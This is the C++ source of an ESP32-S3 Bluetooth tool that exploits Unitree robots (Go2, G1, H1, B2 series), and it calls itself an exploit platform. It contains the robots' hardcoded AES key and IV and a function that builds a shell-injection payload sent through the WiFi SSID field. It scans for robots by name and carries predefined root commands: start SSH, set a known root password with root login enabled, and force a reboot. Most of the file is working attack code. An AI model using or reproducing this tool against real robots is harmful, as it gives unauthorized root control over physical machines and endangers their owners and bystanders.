/*
 * ESP32-S3 Unitree Robot BLE Exploit Tool
 * Based on UniPwn research by Bin4ry and h0stile
 * 
 * This tool exploits the BLE WiFi configuration vulnerability
 * in Unitree robots (Go2, G1, H1, B2 series)
 */

#include "config.h"
// Use built-in ESP32 BLE stack for better compatibility
#include "BLEDevice.h"
#include "BLEClient.h"
#include "BLEScan.h"
#include "BLEAdvertisedDevice.h"
#include "BLERemoteCharacteristic.h"
#include <WiFi.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <mbedtls/aes.h>
#include <Preferences.h>
#include <vector>
#include <map>
#include <algorithm>

// UUIDs from original Python code
#define DEVICE_NAME_UUID        "00002a00-0000-1000-8000-00805f9b34fb"
#define CUSTOM_CHAR_UUID        "0000ffe1-0000-1000-8000-00805f9b34fb"
#define CUSTOM_CHAR_UUID_2      "0000ffe2-0000-1000-8000-00805f9b34fb"
#define UNITREE_SERVICE_UUID    "0000ffe0-0000-1000-8000-00805f9b34fb"

// Configuration
#define SCAN_TIME_SECONDS 30
// CHUNK_SIZE is now defined in config.h
#define MAX_RECENT_DEVICES 5

// Continuous scanning variables
bool continuousScanning = false;
unsigned long lastScanTime = 0;
const unsigned long CONTINUOUS_SCAN_INTERVAL = 1500; // 1.5 seconds between scans

// Hardcoded AES parameters (from reverse engineering)
const uint8_t AES_KEY[16] = {
    0xdf, 0x98, 0xb7, 0x15, 0xd5, 0xc6, 0xed, 0x2b,
    0x25, 0x81, 0x7b, 0x6f, 0x25, 0x54, 0x12, 0x4a
};

const uint8_t AES_IV[16] = {
    0x28, 0x41, 0xae, 0x97, 0x41, 0x9c, 0x29, 0x73,
    0x29, 0x6a, 0x0d, 0x4b, 0xdf, 0xe1, 0x9a, 0x4f
};

const String HANDSHAKE_CONTENT = "unitree"; // Standard handshake content for real Unitree robots
const String COUNTRY_CODE = "US";

// External declarations for web interface variables
#if ENABLE_WEB_INTERFACE
extern String serialLogBuffer;
#endif

// Predefined commands
struct Command {
    String name;
    String cmd;
    String description;
};

std::vector<Command> predefinedCmds = {
    {"enable_ssh", "/etc/init.d/ssh start", "Enable SSH access"},
    {"change_root_pwd", "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;", "Change root password"},
    {"get_serial", "cat /sys/class/dmi/id/product_serial", "Get robot serial number"},
    {"reboot", "reboot -f", "Reboot the robot"},
    {"get_info", "cat /etc/os-release && uname -a", "Get system information"}
};

// Device structure
struct UnitreeDevice {
    String address;
    String name;
    int rssi;
    unsigned long lastSeen;
    String uuid;  // New field for service UUID
};

// Global variables
std::vector<UnitreeDevice> discoveredDevices;
std::vector<UnitreeDevice> recentDevices;
BLEClient* pClient = nullptr;
BLERemoteCharacteristic* pWriteChar = nullptr;
BLERemoteCharacteristic* pNotifyChar = nullptr;
bool deviceConnected = false;
bool verbose = true;  // Always enabled - no menu to toggle
std::vector<uint8_t> receivedNotification;
bool notificationReceived = false;
std::map<uint8_t, std::vector<uint8_t>> serialChunks;

// Hardware feedback runtime toggles
bool buzzerEnabled = true;
bool ledEnabled = true;
Preferences preferences;

// Function declarations
void styledPrint(const String& message, bool verboseOnly = false);
void debugPrint(const String& message, const String& category = "DEBUG");
void infoPrint(const String& message);
void warningPrint(const String& message);
void errorPrint(const String& message);
void successPrint(const String& message);
String buildPwn(const String& cmd);
std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data);
std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data);
std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes = {});
bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction);
void scanForDevices();
void startContinuousScanning();
void stopContinuousScanning();
void performSingleScan();
bool connectToDevice(const UnitreeDevice& device);
void exploitDevice(const String& ssid, const String& password);
void loadRecentDevices();
void saveRecentDevices();
void addRecentDevice(const UnitreeDevice& device);
void saveConfiguration();
void loadConfiguration();

// Hardware feedback function declarations
#if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
void initializeHardwareFeedback();
void feedbackExploitSuccess();
void feedbackExploitFailed();
void feedbackTargetFound();
void feedbackScanning();
void feedbackConnecting();
void handleProximityFeedback(int rssi);
void stopAllFeedback();
void toggleBuzzer();
void toggleLED();
void botDetectionBeeps();
void feedbackBotDetection();
#endif
bool executeCommand(const UnitreeDevice& device, const String& command);
bool exploitSequence(const String& ssid, const String& password);

void setup() {
    Serial.begin(115200);
    while (!Serial) delay(10);
    
    // Initialize SPIFFS for device history
    if (!SPIFFS.begin(true)) {
        styledPrint("[-] SPIFFS initialization failed");
    }
    
    // Load recent devices and configuration
    loadRecentDevices();
    loadConfiguration();
    
    // Initialize BLE
    BLEDevice::init("ESP32-UniPwn");
    
    // Ensure BLE scanning is stopped at boot
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->stop();
    pBLEScan->clearResults();
    
    // Display banner with red background for pentesting theme
    Serial.println("\n\033[41;1;37m");  // Red background, bold white text
    Serial.println("+=======================================+");
    Serial.println("|   OUI Spy - UniPwn Edition           |");
    Serial.println("| Unitree Robot BLE Exploit Platform   |");
    Serial.println("| Go2, G1, H1, B2 Series Support       |");
    Serial.println("+=======================================+");
    Serial.println("");
    
    // Initialize hardware feedback system
#if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
    initializeHardwareFeedback();
    // Single beep at boot
    bootBeep();
#endif
    
#if ENABLE_WEB_INTERFACE
    setupWebInterface();
#endif
    
    // Startup message with verbose debugging info
    delay(500); // Let serial stabilize
    Serial.println("");
    Serial.println("+=======================================+");
    Serial.println("|   OUI Spy - UniPwn Edition           |");
    Serial.println("| Unitree Robot BLE Exploit Platform   |");
    Serial.println("| Go2, G1, H1, B2 Series Support       |");
    Serial.println("+=======================================+");
    Serial.println("");
    Serial.println("Based on: github.com/Bin4ry/UniPwn");
    Serial.println("Research by Bin4ry and d0tslash/kevin finnistaire - 2024");
    Serial.println("");
    Serial.println("WiFi: UniPwn (password: unipwn123)");
    Serial.println("Web: http://192.168.4.1");
    Serial.println("");
    Serial.println("=== VERBOSE DEBUG MODE ENABLED ===");
    Serial.println("All exploitation steps will be logged");
    Serial.println("");
    
    // Debug system information
    debugPrint("System initialized successfully", "BOOT");
    debugPrint("Chip: " + String(ESP.getChipModel()) + " Rev " + String(ESP.getChipRevision()), "BOOT");
    debugPrint("Free heap: " + String(ESP.getFreeHeap() / 1024) + " KB", "BOOT");
    debugPrint("SPIFFS ready: " + String(SPIFFS.begin(true) ? "YES" : "NO"), "BOOT");
    debugPrint("BLE stack initialized", "BOOT");
    debugPrint("Ready for operations", "BOOT");
    Serial.println("");
}

void loop() {
#if ENABLE_WEB_INTERFACE
    handleWebInterface();
#endif
    
    // Handle continuous scanning
    if (continuousScanning) {
        unsigned long currentTime = millis();
        if (currentTime - lastScanTime >= CONTINUOUS_SCAN_INTERVAL) {
            debugPrint("Continuous scan cycle - searching for Unitree devices...", "SCAN");
            debugPrint("Scan interval: " + String(CONTINUOUS_SCAN_INTERVAL) + "ms", "SCAN");
            performSingleScan();
            lastScanTime = currentTime;
            
            // Print current device count
            if (discoveredDevices.size() > 0) {
                infoPrint("Found " + String(discoveredDevices.size()) + " Unitree device(s) so far");
            } else {
                debugPrint("No targets found in this scan cycle", "SCAN");
            }
        }
    }
    
    // No menu - all operations via web interface
    delay(10);
}

void styledPrint(const String& message, bool verboseOnly) {
    if (verboseOnly && !verbose) return;
    Serial.print("\033[1;32m[//]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    // Mirror to web operations log
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[//] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void debugPrint(const String& message, const String& category) {
    if (!verbose) return;
    Serial.print("\033[1;36m[" + category + "]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[" + category + "] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void infoPrint(const String& message) {
    Serial.print("\033[1;34m[INFO]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[INFO] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void warningPrint(const String& message) {
    Serial.print("\033[1;33m[WARN]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[WARN] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void errorPrint(const String& message) {
    Serial.print("\033[1;31m[ERROR]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[ERROR] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

void successPrint(const String& message) {
    Serial.print("\033[1;32m[SUCCESS]\033[0m ");
    Serial.println(message);
    
    #if ENABLE_WEB_INTERFACE
    extern void mirrorSerialToWeb(const String& message);
    String fullMessage = "[SUCCESS] " + message;
    mirrorSerialToWeb(fullMessage);
    #endif
}

String buildPwn(const String& cmd) {
    debugPrint("Building exploit payload for command injection", "EXPLOIT");
    debugPrint("Raw command: " + cmd, "EXPLOIT");
    String payload = "\";$(" + cmd + ");#";
    debugPrint("Payload constructed: " + payload, "EXPLOIT");
    debugPrint("Payload length: " + String(payload.length()) + " bytes", "EXPLOIT");
    return payload;
}

std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
    debugPrint("Starting AES-128-CFB encryption", "CRYPTO");
    debugPrint("Plaintext size: " + String(data.size()) + " bytes", "CRYPTO");
    
    // Show first few bytes of plaintext for debugging
    String plaintextHex = "Plaintext (first 16 bytes): ";
    for (size_t i = 0; i < min((size_t)16, data.size()); i++) {
        plaintextHex += String(data[i], HEX) + " ";
    }
    debugPrint(plaintextHex, "CRYPTO");
    
    std::vector<uint8_t> encrypted(data.size());
    mbedtls_aes_context aes_ctx;
    size_t offset = 0;
    uint8_t iv_copy[16];
    
    // Copy IV since it gets modified
    memcpy(iv_copy, AES_IV, 16);
    
    debugPrint("AES Key initialized (16 bytes)", "CRYPTO");
    debugPrint("AES IV initialized (16 bytes)", "CRYPTO");
    
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_ENCRYPT, data.size(), 
                             &offset, iv_copy, data.data(), encrypted.data());
    mbedtls_aes_free(&aes_ctx);
    
    // Show first few bytes of ciphertext for debugging
    String ciphertextHex = "Ciphertext (first 16 bytes): ";
    for (size_t i = 0; i < min((size_t)16, encrypted.size()); i++) {
        ciphertextHex += String(encrypted[i], HEX) + " ";
    }
    debugPrint(ciphertextHex, "CRYPTO");
    debugPrint("Encryption complete: " + String(encrypted.size()) + " bytes", "CRYPTO");
    
    return encrypted;
}

std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data) {
    debugPrint("Starting AES-128-CFB decryption", "CRYPTO");
    debugPrint("Ciphertext size: " + String(data.size()) + " bytes", "CRYPTO");
    
    std::vector<uint8_t> decrypted(data.size());
    mbedtls_aes_context aes_ctx;
    size_t offset = 0;
    uint8_t iv_copy[16];
    
    // Copy IV since it gets modified
    memcpy(iv_copy, AES_IV, 16);
    
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_DECRYPT, data.size(), 
                             &offset, iv_copy, data.data(), decrypted.data());
    mbedtls_aes_free(&aes_ctx);
    
    // Show first few bytes of decrypted data
    String decryptedHex = "Decrypted (first 16 bytes): ";
    for (size_t i = 0; i < min((size_t)16, decrypted.size()); i++) {
        decryptedHex += String(decrypted[i], HEX) + " ";
    }
    debugPrint(decryptedHex, "CRYPTO");
    debugPrint("Decryption complete: " + String(decrypted.size()) + " bytes", "CRYPTO");
    
    return decrypted;
}

std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes) {
    debugPrint("=== CREATING PACKET ===", "PACKET");
    debugPrint("Instruction: 0x" + String(instruction, HEX), "PACKET");
    debugPrint("Data payload size: " + String(dataBytes.size()) + " bytes", "PACKET");
    
    std::vector<uint8_t> instructionData = {instruction};
    instructionData.insert(instructionData.end(), dataBytes.begin(), dataBytes.end());
    
    uint8_t length = instructionData.size() + 3;
    std::vector<uint8_t> fullData = {0x52, length};
    fullData.insert(fullData.end(), instructionData.begin(), instructionData.end());
    
    debugPrint("Packet header: 0x52 (opcode)", "PACKET");
    debugPrint("Packet length: " + String(length) + " bytes", "PACKET");
    
    // Calculate checksum
    uint8_t checksum = 0;
    for (uint8_t b : fullData) {
        checksum += b;
    }
    checksum = (~checksum + 1) & 0xFF; // Two's complement
    
    fullData.push_back(checksum);
    debugPrint("Checksum calculated: 0x" + String(checksum, HEX), "PACKET");
    debugPrint("Total packet size before encryption: " + String(fullData.size()) + " bytes", "PACKET");
    
    // Show full packet structure before encryption
    String packetHex = "Packet structure: ";
    for (size_t i = 0; i < min((size_t)32, fullData.size()); i++) {
        packetHex += String(fullData[i], HEX) + " ";
    }
    if (fullData.size() > 32) packetHex += "...";
    debugPrint(packetHex, "PACKET");
    
    std::vector<uint8_t> encrypted = encryptData(fullData);
    debugPrint("Packet encrypted, final size: " + String(encrypted.size()) + " bytes", "PACKET");
    return encrypted;
}

bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
    debugPrint("=== VALIDATING RESPONSE ===", "VALIDATE");
    debugPrint("Response size: " + String(response.size()) + " bytes", "VALIDATE");
    
    // Show full response
    String responseHex = "Response bytes: ";
    for (size_t i = 0; i < min((size_t)16, response.size()); i++) {
        responseHex += String(response[i], HEX) + " ";
    }
    if (response.size() > 16) responseHex += "...";
    debugPrint(responseHex, "VALIDATE");
    
    if (response.size() < 5) {
        errorPrint("Response packet too short: " + String(response.size()));
        return false;
    }
    
    debugPrint("Checking opcode: 0x" + String(response[0], HEX) + " (expecting 0x51)", "VALIDATE");
    if (response[0] != 0x51) {
        errorPrint("Invalid opcode in response: 0x" + String(response[0], HEX));
        return false;
    }
    
    debugPrint("Checking length: packet=" + String(response.size()) + ", header=" + String(response[1]), "VALIDATE");
    if (response.size() != response[1]) {
        errorPrint("Packet length mismatch: Expected " + String(response[1]) + ", Got " + String(response.size()));
        return false;
    }
    
    debugPrint("Checking instruction: got=0x" + String(response[2], HEX) + ", expected=0x" + String(expectedInstruction, HEX), "VALIDATE");
    if (response[2] != expectedInstruction) {
        errorPrint("Instruction mismatch: Expected " + String(expectedInstruction) + 
                   ", Got " + String(response[2]));
        return false;
    }
    
    // Verify checksum
    uint8_t expectedChecksum = 0;
    for (size_t i = 0; i < response.size() - 1; i++) {
        expectedChecksum += response[i];
    }
    expectedChecksum = (~expectedChecksum + 1) & 0xFF;
    
    debugPrint("Checking checksum: calculated=0x" + String(expectedChecksum, HEX) + 
               ", received=0x" + String(response[response.size() - 1], HEX), "VALIDATE");
    if (response[response.size() - 1] != expectedChecksum) {
        errorPrint("Checksum validation failed: Expected 0x" + String(expectedChecksum, HEX) + 
                   ", Got 0x" + String(response[response.size() - 1], HEX));
        return false;
    }
    
    debugPrint("Checking status byte: response[3]=0x" + String(response[3], HEX) + " (expecting 0x01)", "VALIDATE");
    bool isValid = response[3] == 0x01;
    
    if (isValid) {
        successPrint("Response validation PASSED");
    } else {
        errorPrint("Response validation FAILED - status byte is not 0x01");
    }
    
    return isValid;
}

// Menu system removed - all control via web interface
// Verbose debugging is always enabled for full visibility

// BLE Scan callback
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        String deviceName = advertisedDevice.getName().c_str();
        String deviceAddress = advertisedDevice.getAddress().toString().c_str();
        int rssi = advertisedDevice.getRSSI();
        
        // Show ALL BLE devices in operations log (not just verbose mode)
        // Use char buffer to avoid String fragmentation during BLE scanning
        char bleMsg[150];
        if (deviceName.length() > 0) {
            snprintf(bleMsg, sizeof(bleMsg), "BLE DEVICE: %s (%s) RSSI: %d dBm", 
                    deviceName.c_str(), deviceAddress.c_str(), rssi);
        } else {
            snprintf(bleMsg, sizeof(bleMsg), "BLE DEVICE: [UNNAMED] (%s) RSSI: %d dBm", 
                    deviceAddress.c_str(), rssi);
        }
        infoPrint(String(bleMsg));
        
        // Check if it's a Unitree device
        if (deviceName.startsWith("G1_") || deviceName.startsWith("Go2_") || 
            deviceName.startsWith("B2_") || deviceName.startsWith("H1_") || 
            deviceName.startsWith("X1_")) {
            
            // IMMEDIATE detection print - use char buffer to avoid String fragmentation
            char targetMsg[200];
            snprintf(targetMsg, sizeof(targetMsg), "*** UNITREE TARGET DETECTED ***: %s (%s) RSSI: %d dBm", 
                    deviceName.c_str(), deviceAddress.c_str(), rssi);
            successPrint(String(targetMsg));
            
#if ENABLE_WEB_INTERFACE
            // IMMEDIATE web UI update - don't wait for full processing!
            String immediateLog = "TARGET FOUND: " + deviceName + " (" + deviceAddress + ") RSSI: " + String(rssi) + " dBm<br>";
            serialLogBuffer += immediateLog;
            
            // IMMEDIATE UI population - add device to list instantly for UI polling
            UnitreeDevice immediateDevice;
            immediateDevice.address = deviceAddress;
            immediateDevice.name = deviceName;
            immediateDevice.rssi = rssi;
            immediateDevice.lastSeen = millis();
            immediateDevice.uuid = "PROCESSING..."; // Will be updated later
            
            // Check if already in list (avoid duplicates)
            bool alreadyExists = false;
            for (auto& d : discoveredDevices) {
                if (d.address == deviceAddress) {
                    // Update existing entry
                    d.rssi = rssi;
                    d.lastSeen = millis();
                    d.name = deviceName;
                    alreadyExists = true;
                    break;
                }
            }
            
            if (!alreadyExists) {
                // Add immediately so UI polls can see it right away
                discoveredDevices.push_back(immediateDevice);
            }
#endif
            
            UnitreeDevice device;
            device.address = advertisedDevice.getAddress().toString().c_str();
            device.name = deviceName;
            device.rssi = advertisedDevice.getRSSI();
            device.lastSeen = millis();
            // Capture all available UUIDs from BLE advertisement
            String allUUIDs = "";
            
            // Method 1: Primary service UUID
            if (advertisedDevice.haveServiceUUID()) {
                allUUIDs = advertisedDevice.getServiceUUID().toString().c_str();
            }
            
            // Method 2: Service data UUIDs
            if (advertisedDevice.getServiceDataCount() > 0) {
                for (int i = 0; i < advertisedDevice.getServiceDataCount(); i++) {
                    String serviceUUID = advertisedDevice.getServiceDataUUID(i).toString().c_str();
                    if (allUUIDs.length() == 0) {
                        allUUIDs = serviceUUID;
                    } else if (allUUIDs.indexOf(serviceUUID) == -1) {  // Avoid duplicates
                        allUUIDs += ", " + serviceUUID;
                    }
                }
            }
            
            // Method 3: Try to get payload length info (getPayload returns uint8_t*)
            size_t payloadLength = advertisedDevice.getPayloadLength();
            if (payloadLength > 0 && allUUIDs.length() == 0) {
                allUUIDs = "RAW_DATA_" + String(payloadLength) + "_BYTES";
            }
            
            if (allUUIDs.length() == 0) {
                allUUIDs = "NO_SERVICES";
            }
            
            device.uuid = allUUIDs;
            
            // Update existing entry with complete UUID info (device was already added immediately above)
            bool found = false;
            for (auto& d : discoveredDevices) {
                if (d.address == device.address) {
                    d.rssi = device.rssi;  // Update RSSI
                    d.lastSeen = device.lastSeen;
                    d.name = deviceName;  // Update name in case it changed
                    d.uuid = device.uuid;  // Update UUID from "PROCESSING..." to actual UUID
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                // This should rarely happen since we add immediately above
                discoveredDevices.push_back(device);
            }
            
            // Log UUID information (clean, no spam)
            infoPrint("Unitree UUID: " + device.uuid);
            
            // Only do feedback and notification for truly new devices
            if (!found) {
                // Bot detection feedback - 3 fast beeps and LED pattern
#if ENABLE_BUZZER || ENABLE_LED_FEEDBACK
                feedbackBotDetection();
#endif

                // IMMEDIATE web interface update when robot is detected
#if ENABLE_WEB_INTERFACE
                notifyWebInterfaceNewTarget(device);
#endif
            } else {
                // Skip serial print for updates to avoid "double detection" feel
                // styledPrint("Updated: " + deviceName + " (" + device.address + ") RSSI: " + String(device.rssi));
                
                // Heartbeat beeps for device still around (but not too frequently)
                static unsigned long lastHeartbeatTime = 0;
                if (millis() - lastHeartbeatTime > 5000) {  // Every 5 seconds max
#if ENABLE_BUZZER
                    heartbeatBeeps();
#endif
                    lastHeartbeatTime = millis();
                }
            }
        }
    }
};

void startContinuousScanning() {
    infoPrint("Starting CONTINUOUS BLE scan for Unitree devices...");
    infoPrint("Scan will continue until stopped via web interface");
    continuousScanning = true;
    discoveredDevices.clear();
    lastScanTime = 0; // Force immediate first scan
    
#if ENABLE_BUZZER
    scanningBeeps();
#endif
}

void stopContinuousScanning() {
    infoPrint("Stopping continuous BLE scan...");
    continuousScanning = false;
    
    // Stop any active scan
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->stop();
    pBLEScan->clearResults();
    
    successPrint("Continuous scanning stopped. Found " + String(discoveredDevices.size()) + " total Unitree target(s)");
}

void performSingleScan() {
    if (!continuousScanning) return; // Safety check
    
    debugPrint("Initializing BLE scan", "SCAN");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    debugPrint("Scan parameters: interval=100, window=99, active=true", "SCAN");
    
    // Very short scan for continuous mode - 1 second
    debugPrint("Starting 1-second scan cycle", "SCAN");
    BLEScanResults* foundDevices = pBLEScan->start(1, false);
    debugPrint("Scan cycle complete, clearing results", "SCAN");
    pBLEScan->clearResults();
}

void scanForDevices() {
    // Legacy single scan for compatibility
    infoPrint("Starting BLE scan for Unitree devices...");
    discoveredDevices.clear();
    
#if ENABLE_BUZZER
    scanningBeeps();
#endif
    
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    BLEScanResults* foundDevices = pBLEScan->start(SCAN_TIME_SECONDS, false);
    pBLEScan->clearResults();
    
    if (discoveredDevices.size() > 0) {
        successPrint("Scan complete. Found " + String(discoveredDevices.size()) + " Unitree target(s)");
        
        // Summary of discovered devices
        for (int i = 0; i < discoveredDevices.size(); i++) {
            infoPrint("Target " + String(i + 1) + ": " + discoveredDevices[i].name + " (" + discoveredDevices[i].address + ") RSSI: " + String(discoveredDevices[i].rssi) + " dBm");
        }
    } else {
        warningPrint("Scan complete. No Unitree devices found in range");
    }
}

void showRecentDevices() {
    if (recentDevices.empty()) {
        styledPrint("No recent devices found");
        return;
    }
    
    styledPrint("Recent devices:");
    for (size_t i = 0; i < recentDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + recentDevices[i].name + 
                      " (" + recentDevices[i].address + ")");
    }
}

void showPredefinedCommands() {
    styledPrint("Available predefined commands:");
    for (size_t i = 0; i < predefinedCmds.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                      " - " + predefinedCmds[i].description);
    }
}

void showSystemInfo() {
    styledPrint("OUI Spy UniPwn System Information:");
    Serial.println("  Chip model: " + String(ESP.getChipModel()));
    Serial.println("  Chip revision: " + String(ESP.getChipRevision()));
    Serial.println("  Flash size: " + String(ESP.getFlashChipSize() / 1024 / 1024) + " MB");
    Serial.println("  Free heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
    Serial.println("  Free PSRAM: " + String(ESP.getFreePsram() / 1024) + " KB");
    Serial.println("  MAC address: " + WiFi.macAddress());
    Serial.println("  Uptime: " + String(millis() / 1000 / 60) + " minutes");
#if ENABLE_WEB_INTERFACE
    Serial.println("  Web interface: ENABLED");
    Serial.println("  Access URL: http://192.168.4.1");
#else
    Serial.println("  Web interface: DISABLED");
#endif
}

#if ENABLE_WEB_INTERFACE
void showWebInterfaceInfo() {
    styledPrint("OUI Spy Web Interface Information:");
    Serial.println("  Status: ACTIVE");
    Serial.println("  SSID: " + String(WIFI_AP_SSID) + WiFi.macAddress().substring(9));
    Serial.println("  Password: " + String(WIFI_AP_PASSWORD));
    Serial.println("  URL: http://192.168.4.1");
    Serial.println("  Features: Professional UI, Real-time scanning,");
    Serial.println("           Attack automation, Target management");
    styledPrint("Connect any device to the WiFi and browse to the URL");
}
#endif

// Storage functions for recent devices
void loadRecentDevices() {
    if (!SPIFFS.exists("/recent_devices.json")) return;
    
    File file = SPIFFS.open("/recent_devices.json", "r");
    if (!file) return;
    
    DynamicJsonDocument doc(2048);
    deserializeJson(doc, file);
    file.close();
    
    JsonArray devices = doc["devices"];
    for (JsonObject device : devices) {
        UnitreeDevice d;
        d.address = device["address"].as<String>();
        d.name = device["name"].as<String>();
        d.lastSeen = device["lastSeen"];
        recentDevices.push_back(d);
    }
}

void saveRecentDevices() {
    DynamicJsonDocument doc(2048);
    JsonArray devices = doc.createNestedArray("devices");
    
    for (const auto& device : recentDevices) {
        JsonObject d = devices.createNestedObject();
        d["address"] = device.address;
        d["name"] = device.name;
        d["lastSeen"] = device.lastSeen;
    }
    
    File file = SPIFFS.open("/recent_devices.json", "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
    }
}

void addRecentDevice(const UnitreeDevice& device) {
    // Remove if already exists
    recentDevices.erase(
        std::remove_if(recentDevices.begin(), recentDevices.end(),
                      [&](const UnitreeDevice& d) { return d.address == device.address; }),
        recentDevices.end());
    
    // Add to front
    recentDevices.insert(recentDevices.begin(), device);
    
    // Keep only last 5
    if (recentDevices.size() > MAX_RECENT_DEVICES) {
        recentDevices.resize(MAX_RECENT_DEVICES);
    }
    
    saveRecentDevices();
}

bool executeCommand(const UnitreeDevice& device, const String& command) {
    Serial.println("");
    Serial.println("========================================");
    Serial.println("   STARTING COMMAND EXECUTION ATTACK    ");
    Serial.println("========================================");
    debugPrint("Target device: " + device.name, "EXPLOIT");
    debugPrint("Target address: " + device.address, "EXPLOIT");
    debugPrint("Command to execute: " + command, "EXPLOIT");
    
    // Stop continuous scanning to prevent BLE interference during exploit
    if (continuousScanning) {
        debugPrint("Stopping BLE scan to prevent interference", "EXPLOIT");
        stopContinuousScanning();
        delay(500); // Give BLE stack time to clean up
        debugPrint("BLE scan stopped successfully", "EXPLOIT");
    }
    
    debugPrint("Initiating connection to target", "EXPLOIT");
    if (!connectToDevice(device)) {
        errorPrint("Failed to connect to device");
        return false;
    }
    successPrint("Connection established");
    
    // Build the exploit payload with the command (per UniPwn research, inject via SSID)
    debugPrint("Building command injection payload", "EXPLOIT");
    String ssid = buildPwn(command);  // Command injection payload for SSID
    String password = "testpassword";  // Normal password
    debugPrint("Payload SSID: " + ssid, "EXPLOIT");
    debugPrint("Payload password: " + password, "EXPLOIT");
    
    // Execute the exploit via validated step-by-step sequence
    debugPrint("Starting exploit sequence", "EXPLOIT");
    bool success = exploitSequence(ssid, password);
    
    // Disconnect
    debugPrint("Disconnecting from target", "EXPLOIT");
    if (pClient && pClient->isConnected()) {
        pClient->disconnect();
        debugPrint("Disconnected successfully", "EXPLOIT");
    }
    
    Serial.println("");
    if (success) {
        Serial.println("========================================");
        Serial.println("     COMMAND EXECUTION COMPLETED        ");
        Serial.println("========================================");
        successPrint("Attack completed successfully");
    } else {
        Serial.println("========================================");
        Serial.println("      COMMAND EXECUTION FAILED          ");
        Serial.println("========================================");
        errorPrint("Attack failed");
    }
    Serial.println("");
    
    return success;
}

// Configuration storage functions
void saveConfiguration() {
    preferences.begin("unipwn", false);
    preferences.putBool("buzzerEnabled", buzzerEnabled);
    preferences.putBool("ledEnabled", ledEnabled);
    preferences.end();
    styledPrint("Configuration saved");
}

void loadConfiguration() {
    preferences.begin("unipwn", true);
    buzzerEnabled = preferences.getBool("buzzerEnabled", true);
    ledEnabled = preferences.getBool("ledEnabled", true);
    preferences.end();
    
    styledPrint("Buzzer: " + String(buzzerEnabled ? "ON" : "OFF") + 
               ", LED: " + String(ledEnabled ? "ON" : "OFF"));
}

// selectAndExploitDevice() is implemented in exploitation.ino
